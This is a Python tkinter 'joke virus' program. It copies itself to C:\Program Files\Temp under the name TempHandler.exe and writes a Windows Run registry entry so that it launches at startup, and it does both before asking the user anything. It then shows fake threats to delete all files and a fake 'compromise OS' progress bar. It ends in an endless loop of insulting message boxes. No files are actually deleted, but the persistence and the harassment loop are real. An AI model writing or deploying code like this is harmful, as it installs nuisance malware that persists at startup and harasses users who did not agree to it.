import time, shutil, os, threading, sys
import tkinter as tk
from tkinter import ttk
from tqdm import tqdm
from tkinter import messagebox
import winreg as reg

# Add the program to Windows startup
def add_to_startup(file_path, app_name="temphandler"):
    try:
        # Open the registry key for current user's startup programs
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        # Set the value for the application
        reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
        reg.CloseKey(key)
    except Exception as e:
        messagebox.showerror(title="Error", message=e)

# Determine the source file path
if getattr(sys, 'frozen', False):
    source_file = sys.executable
else:
    source_file = __file__
source_file_for_copied_exe = 'C:\\Program Files\\Temp\\TempHandler.exe'

destination_dir = 'C:\\Program Files\\Temp'

try:
    os.makedirs(destination_dir, exist_ok=True)
    destination_file = os.path.join(destination_dir, os.path.basename(source_file))
    
    # Check if the source file is already in the destination directory
    if os.path.abspath(source_file) != os.path.abspath(destination_file):
        if not os.path.exists(destination_file):
            shutil.copy2(source_file, destination_file)
except PermissionError:
    messagebox.showerror(title='Access Denied!', message='You have to run this application as an administrator.')
    sys.exit()
except Exception as e:
    messagebox.showerror(title='Error', message=f'An unexpected error occurred: {e}')
    sys.exit()

add_to_startup(source_file_for_copied_exe, app_name="TempHandler")

messagebox.showinfo(title='Congratulations!', message='You have a virus!')
messagebox.showwarning(title='WARNING!', message='This virus will break your computer apart!\nThis virus will delete all your files!\nThis virus will delete all your folders!\nThis virus will delete all your programs!\nThis virus will delete all your games!\nThis virus will delete all your music!\nThis virus will delete all your videos!\nThis virus will delete all your pictures!\nThis virus will delete all your documents!\nThis virus will delete all your downloads!\nThis virus will delete all your desktop items!')
messagebox.showwarning(title='WARNING!', message='This program contains flashing lights!')
if messagebox.askyesno(title='DANGER!', message='Are you sure you want to run this virus?', icon='error'):
    if messagebox.askokcancel(title='Your last chance!', message='This is your last chance!\nAre you sure you want to run this virus?', icon='error'):
        
        def show_loading_popup(title="System", message="Preparing to compromise OS:"):
            popup = tk.Toplevel()
            popup.title(title)
            popup.geometry("400x120")
            popup.resizable(False, False)
            popup.grab_set()
            popup.attributes("-topmost", True)

            label = ttk.Label(popup, text=message)
            label.pack(pady=(10, 5))

            progress = ttk.Progressbar(popup, mode='determinate', length=350)
            progress.pack(pady=5)

            status_label = ttk.Label(popup, text="0/79042")
            status_label.pack(pady=(5, 10))

            def run_loop():
                try:
                    total = 79042
                    progress["maximum"] = total

                    for i in tqdm(range(total), desc=message, disable=True):  # tqdm is used, but silent
                        progress["value"] = i + 1
                        status_label.config(text=f"{i + 1}/{total}")
                        popup.update_idletasks()

                    popup.destroy()
                except Exception:
                    messagebox.showinfo(title='System', message='This program will contine to run in the background.')
                    time.sleep(10)
                    messagebox.showerror(title='ERROR!', message='Something went wrong and the termination of your system failed! Fuck you!')
                    messagebox.showinfo(title='SORRY!', message='As a way to make it up to you.')
                    while True:
                        messagebox.showinfo(title='Blehhh', message='You are an idiot!')
                time.sleep(3)
                messagebox.showerror(title='ERROR!', message='Something went wrong and the termination of your system failed! Fuck you!')
                messagebox.showinfo(title='SORRY!', message='As a way to make it up to you.')
                while True:
                    messagebox.showinfo(title='Blehhh', message='You are an idiot!')
    
            threading.Thread(target=run_loop, daemon=True).start()

        # Main GUI
        root = tk.Tk()
        root.withdraw()  # Hide main window

        show_loading_popup()
        root.mainloop()